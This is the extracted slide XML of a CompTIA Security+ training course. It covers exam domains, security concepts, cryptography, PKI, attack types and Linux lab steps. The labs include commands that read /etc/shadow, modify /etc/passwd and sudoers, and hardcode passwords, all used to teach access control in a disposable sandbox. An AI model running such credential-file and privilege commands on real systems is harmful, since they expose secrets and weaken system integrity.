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39181-CompTIA-Certified-SecurityPlus-Training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omptia.org/certifications/security" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://home.pearsonvue.com/comptia" TargetMode="External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practice-exams/comptia/comptia-security-plus" TargetMode="External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058400" y="658368"/>
            <a:ext cx="141732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731520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SY0-701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152144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00" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>COMPTIA SECURITY+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CompTIA Security+ Certification (SY0-701)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977639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TGS-2023039181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v2.0  ·  18 August 2026  ·  Trainer: Dr.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 must take the AM, PM and Assessment digital attendance for this WSQ-funded course.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24528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468880"/>
            <a:ext cx="245287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15059" y="2834640"/>
            <a:ext cx="777240" cy="7772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5059" y="2834640"/>
            <a:ext cx="777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840480"/>
            <a:ext cx="212369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Trainer shows QR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251960"/>
            <a:ext cx="212369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trainer/administrator displays the SSG TRAQOM QR code from the portal.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1830" y="365760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4438" y="2468880"/>
            <a:ext cx="24528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4438" y="2468880"/>
            <a:ext cx="245287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42257" y="2834640"/>
            <a:ext cx="777240" cy="7772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2257" y="2834640"/>
            <a:ext cx="777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69030" y="3840480"/>
            <a:ext cx="212369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Scan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9030" y="4251960"/>
            <a:ext cx="212369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 your phone camera and scan the QR code shown on screen.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9028" y="365760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468880"/>
            <a:ext cx="24528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468880"/>
            <a:ext cx="24528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69455" y="2834640"/>
            <a:ext cx="777240" cy="7772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9455" y="2834640"/>
            <a:ext cx="777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6228" y="3840480"/>
            <a:ext cx="212369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6228" y="4251960"/>
            <a:ext cx="212369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and submit your attendance for this session (AM / PM / Assessment).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66226" y="365760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58834" y="2468880"/>
            <a:ext cx="24528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58834" y="2468880"/>
            <a:ext cx="245287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96653" y="2834640"/>
            <a:ext cx="777240" cy="7772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6653" y="2834640"/>
            <a:ext cx="777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3426" y="3840480"/>
            <a:ext cx="212369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75% required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3426" y="4251960"/>
            <a:ext cx="212369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75% attendance is required for assessment eligibility and funding.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CompTIA Security+ / cybersecurity — defensive &amp; offensive security.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cybersecurity, cloud, networking &amp; software engineering.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IT security, networking or Linux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What you want to be able to do — or which exam domain you want to master —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LMS-TMS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Your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Your slides, Learner Guide and Lesson Plan are on the LMS/TMS portal — download them before the open-book assessment.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0634472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505456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2505456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2505456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83080" y="2423160"/>
            <a:ext cx="94183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2423160"/>
            <a:ext cx="91440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>
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>🔒  https://lms-tms.tertiaryinfotech.com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246120"/>
            <a:ext cx="2452878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246120"/>
            <a:ext cx="245287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37919" y="3566160"/>
            <a:ext cx="731520" cy="7315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7919" y="356616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4480560"/>
            <a:ext cx="212369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Log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6320"/>
            <a:ext cx="212369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Sign in to lms-tms.tertiaryinfotech.com with your enrolled email.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11830" y="429768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4438" y="3246120"/>
            <a:ext cx="2452878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04438" y="3246120"/>
            <a:ext cx="245287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65117" y="356616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5117" y="356616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030" y="4480560"/>
            <a:ext cx="212369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the course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030" y="4846320"/>
            <a:ext cx="212369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Go to My Courses → CompTIA Certified Security+ Training.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39028" y="429768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1636" y="3246120"/>
            <a:ext cx="2452878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1636" y="3246120"/>
            <a:ext cx="24528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92315" y="35661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92315" y="356616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6228" y="4480560"/>
            <a:ext cx="212369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Courseware tab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6228" y="4846320"/>
            <a:ext cx="212369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 the Courseware / Materials tab for this course.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66226" y="429768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58834" y="3246120"/>
            <a:ext cx="2452878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58834" y="3246120"/>
            <a:ext cx="245287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819513" y="3566160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19513" y="356616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3426" y="4480560"/>
            <a:ext cx="212369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Download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3426" y="4846320"/>
            <a:ext cx="212369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Download the Slides, Learner Guide and Lesson Plan (PDF).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5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Days 1–3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Days 4–5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General Security Concepts (Domain 1)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Domain 1: General Security Concepts (Labs 1–5)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Threats, Vulnerabilities &amp; Mitigations (Domain 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Domain 2: Threats &amp; Vulnerabilities (Labs 6–13)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3 — Security Architecture (Domain 3)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Domain 3: Security Architecture (Labs 14–20, 37–39)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4 — Security Operations (Domain 4)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Domain 4: Security Operations (Labs 21–30, 40–43)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5 — Program Management, Oversight &amp; Assessment (Domain 5)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Domain 5: Program Management (Labs 31–36)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Final Assessment (WA + PP)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Daily timing: 9:30am–6:30pm · 1-hr lunch · tea within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General Concepts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Controls, CIA &amp; AAA, hashing, encryption and PKI.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Threats &amp; Vulns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Phishing, password &amp; web attacks, malware, scanning, hardening.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Architecture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Segmentation, firewalls, WAF, VPN, encryption, TLS, backup.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Operations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Hardening, MFA, SIEM, IDS, EDR, FIM, vuln mgmt, IR, SOAR.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Program Mgmt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Risk &amp; CVSS, recon, pentesting, compliance, awareness.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Short-Answer Questions (SAQ), 6 questions,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Practical Performance (PP) — 5 hands-on security tasks,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Format: Open Book —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Take the Assessment digital attendance (TRAQOM · SSG QR on the LMS)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— 6 questions, open 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PP — 5 hands-on tasks,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Fundamentals for the SY0-701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CompTIA Security+?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Vendor-neutral baseline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industry standard entry certification for cybersecurity roles.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SY0-701 domains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Five domains from general concepts to program management.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Hands-on and policy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Tests both technical skills and risk / governance knowledge.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security role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Assess posture, apply controls, monitor, respond and manage risk.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Five Exam Domains (SY0-701)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Concepts &amp; Threats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1. General Security Concepts — 12%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2. Threats, Vulns &amp; Mitigations — 22%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Build &amp; Operate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3. Security Architecture — 18%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4. Security Operations — 28%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Govern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5. Security Program Management &amp; Oversight — 20%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Passing score: 750 / 900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EXAM BLUEPRINT · WHERE THE MARKS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SY0-701 Exam Domains &amp; Weightings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Domain 1 · 12%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General Security Concepts — controls, CIA/AAA, Zero Trust, cryptography, PKI.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Domain 2 · 22%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Threats, Vulnerabilities &amp; Mitigations — actors, attacks, social engineering.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Domain 3 · 18%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Security Architecture — cloud/enterprise, segmentation, data protection.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Domain 4 · 28%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Security Operations — hardening, monitoring, IAM, IR, forensics (largest).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Domain 5 · 20%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Program Management &amp; Oversight — governance, risk, audits, awareness.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STUDY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This Course Maps to the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This course is organised domain-by-domain in exam order — Day 1 = Domain 1, and so on.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Each domain opens with its exam weighting, then teaches every key concept, then drills it with hands-on labs.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43 labs and the concept slides are tagged to the SY0-701 objectives (1.1–5.6).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Master the concepts here, do every lab, then sit the practice exam at the end — the fastest path to a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Defence in depth: layer controls so no single failure is fatal.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Confidentiality, integrity and availability are the goals — every control in this course serves one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CIA Triad &amp; AAA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Only authorised parties can read the data — encryption, access control.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Data is not altered undetected — hashing, digital signatures.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Availability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Systems and data are there when needed — redundancy, backup, DoS defence.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AAA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Authentication proves who you are, authorization what you may do, accounting logs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WORKBENCH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Your Lab Workbench — Killercoda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Every hands-on lab runs in a free, disposable Ubuntu VM in your browser.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Open the playground: https://killercoda.com/playgrounds/scenario/ubuntu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 have a root shell with internet access — install tools with apt or a single binary.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Reset the playground between labs that change firewall, PAM or routing state.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36 LABS · FREE IN YOUR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All 36 labs live in the course GitHub repository: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https://github.com/tertiarycourses/TGS-2023039181-CompTIA-Certified-SecurityPlus-Training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5074920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507492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Option A — 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118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a terminal / Killercoda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git clone the repository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cd into labs/ and follow along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4983480"/>
            <a:ext cx="4526280" cy="4572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CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ git clone https://github.com/tertiarycourses/TGS-2023039181-CompTIA-Certified-SecurityPlus-Training.git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880360"/>
            <a:ext cx="5074920" cy="2651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2880360"/>
            <a:ext cx="507492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Option B — Download ZIP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6118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On GitHub click the green Code button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Choose Download ZIP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Unzip and open the labs/ folder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Every lab runs free in the browser on the Killercoda Ubuntu Playground — no local install required.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INTERACTIVE ED-TOOLS · NO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Your Browser Security Toolkit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7155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7155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92808"/>
            <a:ext cx="4722876" cy="7886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Cybersecurity Simulator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Interactive attack/defence scenario simulator — explore threats and controls safely.  (Labs 1, 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1636" y="1783080"/>
            <a:ext cx="5180076" cy="97155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91440" cy="971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7668" y="1892808"/>
            <a:ext cx="4722876" cy="7886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Ethical Hacking Toolkit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Guided ethical-hacking exercises: recon, scanning and exploitation walk-throughs.  (Labs 32–34)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37510"/>
            <a:ext cx="5180076" cy="97155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37510"/>
            <a:ext cx="91440" cy="97155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047238"/>
            <a:ext cx="4722876" cy="7886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FauxBank Pentest Target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deliberately vulnerable online bank — practise SQL injection and XSS legally.  (Labs 9, 10)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2937510"/>
            <a:ext cx="5180076" cy="97155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937510"/>
            <a:ext cx="91440" cy="971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7668" y="3047238"/>
            <a:ext cx="4722876" cy="7886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Cryptography Toolkit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Visual hashing, symmetric/asymmetric encryption and digital-signature playground.  (Labs 3, 4, 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091940"/>
            <a:ext cx="5180076" cy="97155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091940"/>
            <a:ext cx="91440" cy="97155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2" y="4201668"/>
            <a:ext cx="4722876" cy="7886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IP Calculator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Subnet and CIDR calculator — plan network segments and address ranges.  (Lab 14)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91940"/>
            <a:ext cx="5180076" cy="97155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91940"/>
            <a:ext cx="91440" cy="971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201668"/>
            <a:ext cx="4722876" cy="7886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PCAP Analyzer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and dissect packet captures in the browser — protocols, flows and anomalies.  (Labs 11, 25, 40)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46370"/>
            <a:ext cx="5180076" cy="97155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5246370"/>
            <a:ext cx="91440" cy="97155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356098"/>
            <a:ext cx="4722876" cy="78867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Regex Generator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Build and test regular expressions for log parsing, SIEM queries and filters.  (Labs 21, 24)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General Security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Security controls · CIA &amp; AAA · Zero Trust · Change management · Cryptography · PKI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EXAM WEIGHTING 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General Security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Security controls are grouped by CATEGORY (technical, managerial, operational, physical) and by TYPE (preventive, deterrent, detective, corrective, compensating, directive).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CIA triad — confidentiality, integrity, availability — is the goal; AAA (authentication, authorization, accounting) is how identities are governed; Zero Trust removes implicit trust.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Hashing proves integrity; salting defeats rainbow tables; digital signatures add authenticity and non-repudiation.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Symmetric encryption is fast for bulk data; asymmetric (public-key) solves key exchange; PKI and certificate authorities bind keys to identities.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Types of Security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Categories · Types · Defence in depth · Gap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1.1 · CONTROL CATEGORIES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Technical (logical)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Enforced by hardware/software — firewalls, encryption, ACLs, antivirus, IDS.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Managerial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Policies, risk assessments, procedures — govern how security is run.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Day-to-day people processes — guards, awareness training, change control.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Physical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facilities and hardware — locks, fences, CCTV, access badges.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1.1 · CONTROL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Preventive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Stops an incident before it happens — firewall rule, locked door, least privilege.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Deterrent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Discourages the attempt — warning signs, visible cameras, login banners.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Detective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Identifies and records an incident — IDS, auditd, CCTV review, log monitoring.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Corrective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Restores after an incident — restore from backup, patch, incident response.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Compensating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Alternative control when the primary is not feasible — extra monitoring for a legacy system.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Directive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Directs behaviour — acceptable-use policy, standard operating procedures.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1.1 · WORKED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Mapping Controls: Category × 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Example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Category ·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iptables rule blocking Telnet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auditd watch on /etc/passwd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Acceptable-use policy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Security-awareness training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CCTV at the server room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Restore from a tested backup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Technical · Preventive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Technical · Detective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Managerial · Directive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Operational · Preventive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Physical · Detective (and deterrent)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Operational · Corrective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1.1 · LAYERED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Defence in Depth (Layered Security)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single control is perfect — layer controls so that when one fails, the next still protects the asset.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Layers: perimeter (firewall) → network (segmentation, IDS) → host (hardening, EDR) → application (WAF, input validation) → data (encryption, backup).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Mix categories and types: preventive AND detective, technical AND physical.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Vendor diversity and control diversity avoid a single point of failure in the defence itself.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1.1 ·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Gap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methodical comparison of the CURRENT security posture against a TARGET standard or framework (e.g. CIS, ISO 27001, NIST CSF).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Output: the list of missing or weak controls — the 'gap' — ranked by risk.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Drives the remediation roadmap and budget: close the highest-risk gaps first.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Repeat periodically — a gap analysis is a snapshot, not a one-off exercise.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Fundamental Security Concepts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CIA &amp; DAD · AAA · Non-repudiation · Zero Trust · Physical security · Deception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1.2 · CIA TRIAD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CIA Triad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Confidentiality — only authorised parties can read the data: encryption, access controls, secure protocols (TLS).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Integrity — data cannot be altered undetected: hashing, digital signatures, version control.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Availability — systems and data are there when needed: redundancy, backup, DoS protection.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Every security control in this course exists to protect one or more legs of this triad.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30_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359" y="1874520"/>
            <a:ext cx="4307361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1.2 · DAD TRIAD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DAD Triad — the Attacker's Goals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Disclosure — unauthorised access to data: the breach of confidentiality.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Alteration — unauthorised modification: the breach of integrity.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Denial — making systems unavailable: the breach of availability.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Think in pairs: each attack goal (DAD) maps to the defence goal (CIA) it violates.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37_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4359" y="1874520"/>
            <a:ext cx="4459361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1.2 · AAA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AAA — Authentication, Authorization, Accounting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Authentication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Prove WHO you are — password, token, biometric; verified against an identity store.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Authorization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you MAY do — rights and privileges granted after authentication (least privilege).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Accounting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you DID — logs and audit trails tie every action to an identity.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Non-repudiation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signer cannot deny their action — digital signatures + trusted timestamps.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1.2 · MFA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Authentication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Something you know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Password, PIN, passphrase — cheapest, weakest alone.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Something you have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Smart card, TOTP app, hardware token (FIDO2 key).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Something you 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Biometrics — fingerprint, face, iris.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Somewhere you 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Geolocation / network location as a signal.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Something you do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Behavioural — typing rhythm, gait.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MFA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Combine two or more DIFFERENT factors — two passwords are still one factor.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1.2 · ZERO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Zero Trust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Never trust, always verify — no implicit trust for being 'inside' the network.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Control plane decides: the Policy Engine + Policy Administrator form the Policy Decision Point (PDP).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Data plane enforces: every request passes a Policy Enforcement Point (PEP) before reaching the resource.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Adaptive identity: each access decision re-evaluates identity, device posture, location and risk.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Divide the network into implicit-trust zones as small as possible — ideally per-resource.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46_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402263"/>
            <a:ext cx="4480560" cy="29678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1.2 · PHYSICAL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Physical Security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Perimeter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Bollards, fencing, lighting and signage deter and delay intruders.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 control vestibule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Two-door 'mantrap' — one person authenticates at a time; defeats tailgating.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Surveillance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CCTV, motion/infrared/pressure sensors, security guards.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Badges &amp; locks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Access badges, cipher and biometric locks; visitor logs for accountability.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1.2 · DECEPTION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Deception &amp; Disruption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Honeypot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decoy system built to be attacked — reveals attacker tools and intent.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Honeynet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whole network of decoys simulating a production environment.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Honeyfile / honeytoken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Bait data (fake credentials, records) — any use of it is a high-confidence alert.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 it works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Attackers reveal themselves by touching assets no legitimate user would.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Change Management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Business processes · Technical implications ·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1.3 · CHANGE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Change Management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Most outages and many breaches trace back to uncontrolled change — a firewall rule, a patch, a config edit.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Every change needs: a business case, an approval (CAB), a maintenance window, and a tested backout plan.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Impact analysis before the change; stakeholders informed; ownership assigned.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Standard changes can be pre-approved; emergency changes still get retrospective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1.3 · TECHNICAL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Technical Implications of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Allow / deny lists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Rules must follow the change or things silently break — or stay open.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Downtime &amp; restarts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Services, applications and dependencies restart in the right order.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Legacy applications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Often the constraint — plan compensating controls when they can't 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Dependencies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Map them first: one changed certificate can break a chain of services.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1.3 ·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Documentation &amp; Version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Update diagrams, runbooks and policies as PART of the change — not afterwards.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Version control (git) gives an audit trail: who changed what, when and why — and instant rollback.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Configuration as code turns change management into reviewable pull requests.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 the labs you snapshot configs (iptables-save, /etc/ backups) before changing them — same principle.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Cryptographic Solutions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Encryption · Hashing · Signatures · PKI · Key protection · Obfuscation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WHY CRYPTO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Goals of Cryptography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Encryption makes data unreadable without the key.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Hashes detect any change to data in transit or at rest.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Authentication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Certificates and signatures prove who you are talking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Non-repudiation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 digital signature cannot be denied by the signer.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Algorithms, Keys and Kerckhoffs's Principle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ALGORITHM is the lock; the KEY is what opens it. Security must rest in the key, never in a secret algorithm.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Kerckhoffs's principle: a cryptosystem should stay secure even if everything about it except the key is public.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Key length and randomness drive strength — every extra bit doubles the brute-force work.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Block ciphers encrypt fixed-size blocks (AES: 128-bit); stream ciphers encrypt bit-by-bit (RC4 — now deprecated).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SYMMETRIC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 shared secret key both encrypts and decrypts — fast and efficient for bulk data.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AES (128/192/256-bit) is the modern standard; DES (56-bit) and 3DES are legacy/retired.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hard part is KEY DISTRIBUTION: sharing the secret securely, and key count grows as n(n−1)/2.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 non-repudiation — anyone holding the shared key could have produced the message.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222_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906651"/>
            <a:ext cx="4480560" cy="1959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ASYMMETRIC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Asymmetric (Public-Key)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key PAIR: what the public key encrypts, only the private key decrypts — no shared secret needed.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RSA (2048–4096-bit) is the classic; ECC gives the same strength with far smaller keys — ideal for mobile/IoT.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Diffie-Hellman lets two parties agree a session key over a public channel.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Slower than symmetric — so real systems use it only to exchange keys and to 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HYBRID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Hybrid Encryption — How TLS and GPG Really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Generate a random symmetric session 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Encrypt the DATA with the fast symmetric key (AES)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Encrypt the session key with the recipient's PUBLIC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Send both — only the private key holder can unwrap the session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Recipient decrypts the session key, then the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HASHING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 — the Integrity Primitive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hash maps any input to a fixed-length digest: deterministic, fast, one-way, avalanche effect.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COLLISION (two inputs, same hash) breaks a hash — MD5 and SHA-1 are broken; use SHA-256/SHA-3.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Passwords: never store them — store a SALTED, KEY-STRETCHED hash (bcrypt, PBKDF2, Argon2).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Salting defeats rainbow tables; key stretching makes each guess expensive.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235_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938" y="1874520"/>
            <a:ext cx="4436204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SIGNATURES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Sign: hash the message, then encrypt the hash with your PRIVATE key.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Verify: decrypt the signature with the signer's PUBLIC key and compare with your own hash of the message.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Proves authenticity (who signed), integrity (nothing changed) and non-repudiation.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built exactly this in Lab 3 with openssl dgst — sign, verify, tamper, fail.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238_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336570"/>
            <a:ext cx="4480560" cy="10992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PKI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Public Key Infrastructure (PKI)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PKI binds public keys to identities using digital certificates issued by a Certificate Authority (CA).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Chain of trust: Root CA (offline, the trust anchor) → intermediate CAs → end-entity certificates.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Certificate Signing Request (CSR) carries your public key + identity to the CA for signing.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X.509 certificate fields: subject, issuer, validity dates, public key, extensions (SAN),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244_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247786"/>
            <a:ext cx="4480560" cy="32768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Certificate Lifecycle &amp; Revocation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Lifecycle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Revocation &amp;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Generate key pair → CSR → CA validates identity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 signs → certificate issued and deployed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Renew before expiry (short-lived certs preferred)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Self-signed vs third-party (CA-signed) trust levels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CRL — published list of revoked serial numbers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OCSP — live 'is this cert good?' query (+ stapling)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Certificate pinning defeats man-in-the-middle CAs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Revoke on key compromise, mis-issuance or role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KEY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Protecting Keys in Hardware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TPM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Trusted Platform Module — a secure crypto-processor on the motherboard; anchors disk encryption and secure boot.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HSM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Hardware Security Module — dedicated appliance for key storage and crypto operations; FIPS 140-2 levels 1–4.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Secure enclave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Isolated on-chip area that processes secrets (biometrics, keys) untouchable by the OS.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Key escrow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Keys held by a trusted third party for lawful recovery — a business trade-off, and a target.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OBFUSCATION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Obfuscation &amp; Related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Steganography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Hide the EXISTENCE of data inside images, audio or video.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Tokenization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Replace sensitive values with meaningless tokens; the vault maps them back.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masking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only part of a value — 4111-XXXX-XXXX-1234 — for support and testing.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Blockchain / open ledger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Distributed, append-only record — integrity by consensus and hashing.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1.4 · HANDS-ON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Try It — Cryptography Toolkit (Ed Tool)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Open the browser Cryptography Toolkit: https://alfredang.github.io/cryptography-toolkit/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Hash the same text twice — confirm determinism; change one letter and watch the avalanche effect.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Encrypt/decrypt with AES, then with RSA key pairs — compare speed and key handling.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Generate and verify a digital signature — the visual twin of Labs 3–5.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General Security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Security Controls Categorization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CIA Triad and AAA on Linux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3–4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Hashing, Salting, and Digital Signatures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Symmetric vs. Asymmetric Encryption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Labs 5–5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PKI: Build Your Own Certificate Authority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maps real-world controls to categories and types, then implements a technical preventive control and a detective control on Linux.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control matrix plus a live iptables firewall block and auditd file-watch rule.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iptables, auditd, auditctl, ausearch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Security Controls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Map ten controls to a category and a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Security Controls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Block inbound Telnet with a preventive iptables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iptables -A INPUT -p tcp --dport 23 -j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Security Controls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the firewall rules to confirm the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iptables -L INPUT -n --line-numbers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Security Controls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auditd and watch /etc/passwd for changes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auditd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Security Controls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the detective watch rule and list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auditctl -w /etc/passwd -p wa -k passwd_changes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Security Controls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Trigger a change and confirm auditd detected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"# test" &gt;&gt; /etc/passwd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Security Controls Categorization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Search the audit log for the recorded event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ausearch -k passwd_changes |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Controls Categorization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iptables rule appears in the INPUT chain and ausearch shows the logged /etc/passwd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enforces confidentiality, integrity, and availability, then walks through authentication, authorization, and accounting using built-in Linux tools.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permission-protected secret file, a checksum integrity check, and a scoped sudo rule with an audit trail.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chmod, sha256sum, systemctl, ss, passwd, sudo, su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CIA Triad and AAA on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Protect a secret file so only its owner can read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chmod 600 /home/alice/secret.txt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CIA Triad and AAA on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another user is denied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sudo -u bob cat /home/alice/secret.txt 2&gt;&amp;1 || echo DENIED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CIA Triad and AAA on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Baseline the file hash then detect tampering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sha256sum -c /tmp/secret.sha256 || echo "Integrity FAILED"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CIA Triad and AAA on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Restart sshd and confirm it is listening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systemctl restart ssh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CIA Triad and AAA on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alice's password to authenticate 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passwd alice &lt;&lt;EOF
Lab1234!
Lab1234!
EOF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CIA Triad and AAA on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Grant alice one scoped sudo command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"alice ALL=(ALL) NOPASSWD: /usr/bin/cat /var/log/auth.log" &gt;&gt; /etc/sudoers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CIA Triad and AAA on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authorization is limited then read the log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su - alice -c 'sudo cat /etc/shadow' 2&gt;&amp;1 | tail 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CIA Triad and AAA on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Inspect the accounting trail of sudo/su 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tail -20 /var/log/auth.log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CIA Triad and AAA on Linux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Bob is denied the secret, the tampered checksum fails, alice can run only her one sudo command, and auth.log records every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produces deterministic hashes, adds salt, applies key stretching, and creates and verifies an RSA digital signature.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Salted hashes, a stretched password hash, and a verified RSA signature over a document.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sha256sum, openssl rand, openssl passwd, openssl genrsa, openssl dgst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Hashing, Salting, and Digital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Hash a password twice to show determinism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-n 'Pa$$w0rd' | sha256sum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Hashing, Salting, and Digital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 random salt and hash the salted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SALT=$(openssl rand -hex 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Hashing, Salting, and Digital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Produce a key-stretched SHA-512 crypt hash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passwd -6 -salt $(openssl rand -hex 4) 'Pa$$w0rd'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Hashing, Salting, and Digital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an RSA key pair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genrsa -out priv.pem 2048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Hashing, Salting, and Digital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Export the matching public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rsa -in priv.pem -pubout -out pub.pem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Hashing, Salting, and Digital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Sign a document with the private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dgst -sha256 -sign priv.pem -out order.sig order.txt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Hashing, Salting, and Digital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the signature with the public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dgst -sha256 -verify pub.pem -signature order.sig order.txt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Hashing, Salting, and Digital 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Tamper the file and confirm verification fails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" - extra line" &gt;&gt; order.txt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Hashing, Salting, and Digital Signatures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signature returns Verified OK on the original file and Verification Failure after tampering.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encrypts a file with AES-256, then with GPG public-key crypto, and inspects the hybrid packet structure.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AES-encrypted file, a GPG key pair with a public/private encrypt-decrypt round trip, and a decoded hybrid packet dump.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openssl enc, gnupg, gpg, xxd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Symmetric vs. Asymmetric Encryptio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GnuPG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gnupg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Symmetric vs. Asymmetric Encryptio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Encrypt a message symmetrically with AES-256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enc -aes-256-cbc -pbkdf2 -salt -in msg.txt -out msg.aes -pass pass:Lab1234!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Symmetric vs. Asymmetric Encryptio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Decrypt it with the same passphrase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enc -d -aes-256-cbc -pbkdf2 -in msg.aes -pass pass:Lab1234!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Symmetric vs. Asymmetric Encryptio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 GPG asymmetric key pair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gpg --batch --pinentry-mode loopback --passphrase '' --quick-generate-key 'Alice &lt;alice@lab.local&gt;' rsa2048 default 1y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Symmetric vs. Asymmetric Encryptio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Export Alice's shareable public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gpg --armor --export alice@lab.local &gt; alice.pub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Symmetric vs. Asymmetric Encryptio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Encrypt to Alice's public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gpg --yes --trust-model always -r alice@lab.local -e -o msg.gpg msg.txt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Symmetric vs. Asymmetric Encryptio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Decrypt with Alice's private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gpg --pinentry-mode loopback --passphrase '' -d msg.gpg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Symmetric vs. Asymmetric Encryptio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Inspect the hybrid packet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gpg --list-packets msg.gpg | head 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Symmetric vs. Asymmetric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AES decryption returns the plaintext and the GPG packet dump shows a pubkey-enc packet wrapping an AES-encrypted data packet.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stands up a private root CA, signs a server CSR, revokes the certificate, and publishes a CRL.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self-signed root CA, a CA-signed server certificate, and a CRL listing the revoked cert.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openssl genrsa, openssl req, openssl ca, openssl x509, openssl crl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PKI: Build Your Own Certificate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the CA directory layout and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mkdir -p ~/ca/{certs,private,newcerts,crl}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PKI: Build Your Own Certificate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the root key and self-signed root cert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req -x509 -new -key private/ca.key -days 3650 -sha256 -subj "/CN=Lab Root CA/O=Tertiary InfoTech" -out certs/ca.crt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PKI: Build Your Own Certificate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 server key and a CSR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req -new -key private/server.key -subj "/CN=web.lab.local/O=Lab" -out server.csr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PKI: Build Your Own Certificate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Write the CA config and sign the CSR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ca -batch -config openssl.cnf -in server.csr -out certs/server.crt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PKI: Build Your Own Certificate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the issued cert's issuer and subject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x509 -in certs/server.crt -noout -issuer -subject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PKI: Build Your Own Certificate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Revoke the server certificate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ca -config openssl.cnf -revoke certs/server.crt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PKI: Build Your Own Certificate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and inspect the CRL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ca -config openssl.cnf -gencrl -out crl/lab.crl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PKI: Build Your Own Certificate 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Browse the system's trusted third-party root store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ls /etc/ssl/certs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PKI: Build Your Own Certificate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server cert shows issuer Lab Root CA, and the generated CRL lists server.crt as revoked.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General Security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Categorize and implement security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Demonstrate CIA and AAA with Linux tools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Hash, salt, and sign data with OpenSSL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Compare AES, GPG, and hybrid encryption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Run a CA lifecycle from CSR to CRL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Threats, Vulnerabilities &amp; Mitigations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Threat actors · Social engineering · Malware · Web &amp; password attacks · Wireless · Mitigations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EXAM WEIGHTING 22%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Threats, Vulnerabilities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Threat actors range from script kiddies to organised crime and nation-states — motivation and capability drive the defence you need.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Social engineering and phishing exploit people; SPF, DKIM and DMARC authenticate mail and expose spoofing.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Password, wireless and web application attacks (SQL injection, XSS) exploit weak secrets and unvalidated input; malware analysis reveals indicators of compromise.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Mitigation is layered: vulnerability scanning, patching, hardening baselines, segmentation and monitoring shrink the attack surface.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Threat Actors, Motivations &amp; Vectors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Actor types · Attributes · Motivations · Threat vectors · Attack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2.1 · WHO ATTACKS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Threat Actor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Nation-state / APT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Highly resourced, patient, stealthy — espionage and strategic disruption.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Organized crime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Profit-driven — ransomware, fraud, data theft; runs like a business.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Hacktivist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Ideological — defacement, DoS, leaks to make a political point.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Insider threat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Employee or contractor — misuse of legitimate access; hardest to detect.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Unskilled attacker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'Script kiddie' — runs others' tools; noisy but still dangerous.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Shadow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Unsanctioned systems/services staff spin up — invisible attack surface.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2.1 · PROFILE THE ADVERSARY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Actor Attributes &amp; Motivations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Attributes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Motivations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Internal vs external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Resources &amp; funding (low → nation-state)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Sophistication &amp; capability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Intent and persistence (opportunistic vs targeted)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Financial gain (ransomware, fraud)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Espionage — data and IP theft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Disruption / chaos and revenge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Ideology, blackmail, service/war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2.1 · HOW THEY GET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Threat Vectors &amp; Attack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Message-based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Email, SMS, IM — phishing links and malicious attachments.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Web &amp; file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Drive-by sites, malicious downloads, removable USB media.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Network &amp; wireless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 ports, weak services, rogue APs, evil twins.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Supply chain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Compromised vendor, software update or hardware component.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Credentials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Reused/leaked passwords, default accounts.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Attack surface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sum of all vectors — shrink it: patch, disable, segment, least privilege.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2.2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Threats — Attacks in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Malware · Network attacks · DoS/DDoS · On-path · Application attacks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2.2 · MALWARE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Virus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Attaches to a file; needs the user to run it to spread.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Self-replicating; spreads across the network with no user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Trojan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Disguised as legitimate software; opens a backdoor.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Ransomware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Encrypts data and demands payment — the top business threat today.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Spyware / keylogger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Silently harvests activity, keystrokes and credentials.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Rootkit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Hides in the OS/kernel to keep persistent, stealthy control.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Logic bomb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Malicious code that fires on a condition (date, event).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87668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7668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9188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Bloatware / PUP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Unwanted software that widens the attack surface.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2.2 · DoS / DDoS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Denial-of-Service &amp; DDoS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DoS exhausts a target's resources; DDoS uses a botnet of many sources at once.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Volumetric: UDP flood, ICMP flood — saturate bandwidth.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Protocol: SYN flood leaves half-open TCP connections; amplification/reflection (DNS, NTP) multiplies traffic off third parties.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Mitigation: rate limiting, SYN cookies, upstream scrubbing/CDN, anycast, and ingress filtering (BCP38).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95_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000292"/>
            <a:ext cx="4480560" cy="3771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DNS &amp; Network Attacks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DNS amplification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Small spoofed query → huge reply aimed at the victim.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DNS tunneling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Smuggle data/C2 inside DNS queries to bypass filtering.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DNS hijacking / poisoning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Redirect a name to an attacker's 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On-path (MITM)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Attacker relays and can alter traffic between two parties.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ARP poisoning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Falsify MAC↔IP mapping to intercept a LAN.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Credential replay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Re-send captured authentication data — defeated by nonces/TLS.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2.2 · ON-PATH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On-Path (Man-in-the-Middle) Attacks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attacker sits between client and server, reading and optionally altering traffic.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SSL stripping downgrades HTTPS to HTTP; the user never sees the padlock.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Enablers: open Wi-Fi, ARP/DNS poisoning, rogue proxies.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Defence: end-to-end TLS with HSTS, certificate pinning, and mutual authentication.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07_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822067"/>
            <a:ext cx="4480560" cy="212826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2.2 ·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Application &amp; Privilege Attacks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Privilege escalation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Gain higher rights — vertical (user→root) or horizontal (user→user).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CSRF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Trick a logged-in browser into an unwanted action — defeat with anti-CSRF tokens.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SSRF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Coerce the server into making attacker-chosen requests.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Directory traversal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../ sequences reach files outside the web root.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Injection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Untrusted input becomes code/query — SQLi, command injection.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Replay / forgery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Reuse or fabricate requests the server wrongly trusts.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Social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Phishing family · Pretexting · Impersonation · BEC · Influence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2.3 · THE HUMAN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Social Engineering — Hacking the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Attackers exploit trust, urgency and authority — cheaper than breaking crypto.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Principles of influence: authority, urgency, scarcity, social proof, liking, fear.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most expensive breaches (BEC) use no malware at all — just a convincing email.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Defence is layered: technical (mail auth, filtering) PLUS trained, skeptical people.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737360"/>
            <a:ext cx="4663440" cy="4343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166_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391709"/>
